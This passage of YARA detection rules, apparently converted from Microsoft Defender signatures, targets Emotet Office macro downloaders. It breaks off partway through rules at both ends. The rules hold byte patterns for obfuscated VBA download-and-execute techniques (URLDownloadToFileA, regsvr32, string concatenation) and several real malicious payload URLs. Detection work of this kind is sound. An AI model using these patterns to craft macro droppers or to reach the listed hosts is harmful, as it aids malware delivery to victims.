        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 [0-1] 28 [0-32] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QY_2147745029_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QY!MTB"
        threat_id = "2147745029"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = ", \"\")" ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_6 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-5] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QZ_2147745041_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QZ!MTB"
        threat_id = "2147745041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {56 42 41 2e 52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2e [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RA_2147745122_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RA!MTB"
        threat_id = "2147745122"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 73 6f 61 6d ?? 2e 4f 43 58}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 73 6f 61 6d ?? 2e 6f 63 78}  //weight: 1, accuracy: Low
        $x_5_3 = "URLDownloadToFileA" ascii //weight: 5
        $x_5_4 = "urlmon" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_RA_2147745122_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RA!MTB"
        threat_id = "2147745122"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2e [0-24] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RB_2147745150_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RB!MTB"
        threat_id = "2147745150"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-24] 2e [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RC_2147745151_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RC!MTB"
        threat_id = "2147745151"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 28 [0-37] 28 [0-37] 29 29 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-24] 2e [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 [0-16] 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RD_2147745177_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RD!MTB"
        threat_id = "2147745177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 28 [0-37] 28 [0-37] 29 29 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-24] 2e [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4d 73 67 42 6f 78 20 [0-32] 2e [0-32] 2c 20 22 [0-3] 22 2c 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RE_2147745191_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RE!MTB"
        threat_id = "2147745191"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 28 [0-37] 28 [0-37] 29 29 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-24] 2e [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4d 73 67 42 6f 78 20 22 [0-80] 22 2c 20 22 31 36 22 2c 20 [0-21] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GF_2147745217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GF!MTB"
        threat_id = "2147745217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "30"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 [0-5] 28 00 [0-15] 2c 00 20 00 [0-30] 2c 00 20 00 22 00 22 00 29 00}  //weight: 10, accuracy: Low
        $x_10_2 = {52 65 70 6c 61 63 65 [0-5] 28 [0-15] 2c 20 [0-30] 2c 20 22 22 29}  //weight: 10, accuracy: Low
        $x_10_3 = {2e 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 29 00}  //weight: 10, accuracy: Low
        $x_10_4 = {2e 43 72 65 61 74 65 28 [0-30] 2c 20 [0-30] 2c 20 [0-30] 2c 20 [0-30] 29}  //weight: 10, accuracy: Low
        $x_10_5 = {3d 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 4f 00 62 00 6a 00 65 00 63 00 74 00 28 00 [0-30] 28 00 [0-100] 29 00 29 00}  //weight: 10, accuracy: Low
        $x_10_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-30] 28 [0-100] 29 29}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RG_2147745235_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RG!MTB"
        threat_id = "2147745235"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2e [0-21] 2c 20 [0-16] 28 22}  //weight: 1, accuracy: Low
        $x_1_4 = {36 22 2c 20 [0-18] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RH_2147745289_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RH!MTB"
        threat_id = "2147745289"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-85] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-21] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RI_2147745301_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RI!MTB"
        threat_id = "2147745301"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {29 20 3d 20 [0-21] 28 [0-21] 2e [0-21] 20 2b 20 [0-21] 2e [0-21] 20 2b 20 [0-21] 2e [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-85] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2e}  //weight: 1, accuracy: Low
        $x_1_5 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-149] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RJ_2147745306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RJ!MTB"
        threat_id = "2147745306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-1] 28 [0-21] 2c 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-85] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RK_2147745323_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RK!MTB"
        threat_id = "2147745323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-1] 28 [0-1] 54 72 69 6d 28 22 [0-21] 22 29 [0-64] 54 72 69 6d 28 22 [0-21] 22 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-85] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RO_2147745367_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RO!MTB"
        threat_id = "2147745367"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-1] 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-112] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RP_2147745389_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RP!MTB"
        threat_id = "2147745389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {5c 64 78 67 78 65 [0-2] 2e 6f 63 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RP_2147745389_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RP!MTB"
        threat_id = "2147745389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-8] 54 72 69 6d 28 [0-22] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-112] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RP_2147745389_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RP!MTB"
        threat_id = "2147745389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 72 33 32 2e 65 78 65 2b [0-7] 22 68 74 74 70 3a 2f 2f [0-95] 22 2c 22 [0-7] 22 68 74 74 70 3a 2f 2f [0-95] 22 2c 22 [0-7] 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {30 2c 30 29 [0-31] 72 22 26 22 65 22 26 22 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-5] 53 79 22 26 22 73 22 26 22 57 22 26 22 6f 22 26 22 77 22 26 22 36 34 5c [0-5] 5c 57 22 26 22 69 6e 22 26 22 64 22 26 22 6f 22 26 22 77 22 26 22 73 5c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 79 73 57 6f 77 36 34 5c [0-5] 5c 57 69 6e 64 6f 77 73 5c [0-5] 22 2c 30 2c 30 29 [0-5] 2c 30 2c 22 [0-5] 72 22 26 22 65 67 73 76 22 26 22 72 22 26 22 33 32 2e 65 78 65 65 [0-5] 68 22 26 22 74 74 22 26 22 70 73 3a 2f}  //weight: 1, accuracy: Low
        $x_1_4 = {72 22 26 22 65 22 26 22 67 22 26 22 73 76 22 26 22 72 22 26 22 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-5] 5c 57 22 26 22 69 6e 22 26 22 64 6f 22 26 22 77 22 26 22 73 5c [0-5] 53 79 22 26 22 73 57 22 26 22 6f 77 22 26 22 36 22 26 22 34 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RP_2147745389_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RP!MTB"
        threat_id = "2147745389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"p://lu\"&\"pu\"&\"s.ktcatl.com/w\"&\"p-co\"&\"nt\"&\"e\"&\"n\"&\"t/uC\"&\"cc\"&\"W\"&\"J/\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"ps:/\"&\"/pa\"&\"cke\"&\"rsan\"&\"dm\"&\"ov\"&\"er\"&\"sba\"&\"ng\"&\"al\"&\"orech\"&\"arges.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/Ur\"&\"I6GM\"&\"87K5u\"&\"2y2p\"&\"OW/\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p:/\"&\"/1\"&\"2\"&\"3br\"&\"ea\"&\"th\"&\"e.o\"&\"r\"&\"g/e\"&\"r\"&\"ro\"&\"r/Drs/" ascii //weight: 1
        $x_1_4 = "\"h\"&\"tt\"&\"p\"&\"s://gr\"&\"ee\"&\"nes\"&\"qu\"&\"al\"&\"ityfl\"&\"o\"&\"o\"&\"ri\"&\"ng.c\"&\"o\"&\"m/e\"&\"r\"&\"r\"&\"o\"&\"r/kU\"&\"O7N\"&\"nk\"&\"p\"&\"Mp2\"&\"cs/\"" ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p:/\"&\"/n\"&\"e\"&\"w.h\"&\"ssu\"&\"s.o\"&\"r\"&\"g/w\"&\"p-in\"&\"c\"&\"lu\"&\"d\"&\"es/b\"&\"l\"&\"o\"&\"ck\"&\"s/e\"&\"KI\"&\"D\"&\"0QA\"&\"fL\"&\"US/\"" ascii //weight: 1
        $x_1_6 = {53 79 73 57 6f 77 36 34 5c [0-6] 5c 57 69 6e 64 6f 77 73 5c [0-6] 2c 30 2c 30 29 [0-6] 44 22 26 22 6c 22 26 22 6c 52 22 26 22 65 67 69 73 74 65 72 22 26 22 53 65 72 76 65 22 26 22 [0-10] 22 68 22 26}  //weight: 1, accuracy: Low
        $x_1_7 = "//akhrailway.com/cgi-bin/b5c9cx4ik2ggn6c/" ascii //weight: 1
        $x_1_8 = "//themillionairesweb.com/wp-admin/md/" ascii //weight: 1
        $x_1_9 = "//cmbavocat.fr/wp-admin/ukccu1bqvbsve/" ascii //weight: 1
        $x_1_10 = "//institutionsevigne.org/wp-includes/pvdquhqjyeqoq6r/" ascii //weight: 1
        $x_1_11 = "//idvlab.com.br/wp-admin/fiwbl/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RB_2147745397_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RB!MSR"
        threat_id = "2147745397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "https://buildingsandpools.com/wp-content/iy6ux613260" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RQ_2147745440_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RQ!MTB"
        threat_id = "2147745440"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
